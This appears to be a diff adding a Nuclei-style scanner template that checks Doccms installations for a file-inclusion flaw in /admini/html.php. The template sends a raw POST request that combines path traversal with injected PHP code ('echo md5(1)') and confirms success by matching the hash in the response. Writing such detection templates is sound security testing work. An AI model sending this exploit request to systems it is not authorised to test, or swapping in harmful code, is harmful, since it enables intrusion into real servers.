@@ -1,0 +1,25 @@
+id: Doccms-html-File-contains
+info:
+  name: Doccms-html-File-contains
+  author: apple
+  severity: high
+  description:  Doccms html.php任意文件包含
+  reference:
+    - http://wiki.fofamini.com/2023hw/Doccms%20html.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /admini/html.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+        Content-Length: 72
+
+        m=/../../../admini/views/system/lang/editTags.php&tags=1);echo md5(1);//
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849b'
